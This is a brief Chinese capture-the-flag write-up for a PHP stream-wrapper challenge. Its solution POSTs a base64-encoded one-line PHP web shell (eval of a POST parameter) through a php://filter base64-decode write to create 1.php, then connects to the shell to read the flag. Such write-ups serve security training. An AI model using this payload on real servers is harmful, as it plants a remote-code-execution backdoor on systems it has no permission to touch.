- 出题人: xidaner
- 难度: 中等
- 考点: 对 php 伪协议的学习和绕过
- 解法:

    使用 `filename=php://filter/write=convert.base64-decode` 来进行对 `filename` 变量的处理，既以 base64 的编码来读。, 将命令 ` 一句话马 ` 用 base64 编码，得到 `PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=`

    post 发包
    ```
    code=PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&filename=php://filter/write=convert.base64-decode/resource=1.php
    ```
    连接即可

- flag: flag 在根目录 flag.txt
- 注意点: 无